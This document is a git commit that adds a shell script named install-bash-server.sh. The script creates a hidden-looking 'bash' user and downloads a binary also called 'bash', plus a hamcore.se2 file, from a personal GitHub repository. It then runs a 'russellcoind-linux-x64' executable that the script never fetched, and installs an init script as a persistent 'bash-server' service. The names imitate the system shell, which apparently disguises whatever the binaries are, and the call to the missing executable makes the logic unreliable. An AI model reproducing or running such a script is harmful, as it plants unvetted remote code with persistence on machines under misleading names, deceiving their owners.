6d962020bf90784e75394da9246a609cc15c01ed
zhhww58 <56435151+zhhww58@users.noreply.github.com>
2019-10-19 02:01:43 +0800

    install bash-server

---
+++ install-bash-server.sh
@@ -0,0 +1,16 @@
+#!/bin/sh
+echo |adduser bash --disabled-password --disabled-login 
+su bash -c  'mkdir /home/bash/bin'
+cd /home/bash/bin
+rm -rf bash
+su bash -c  'wget https://github.com/zhhww58/myscript/raw/master/hamcore.se2'
+su bash -c  'wget https://github.com/zhhww58/myscript/raw/master/bash'
+su bash -c  'chmod +x bash'
+su bash -c  './russellcoind-linux-x64'
+cd /etc/init.d/
+rm -rf bash-server
+wget https://github.com/zhhww58/myscript/raw/master/bash-server
+chmod 755 bash-server
+systemctl disable bash-server
+systemctl enable bash-server
+systemctl start bash-server
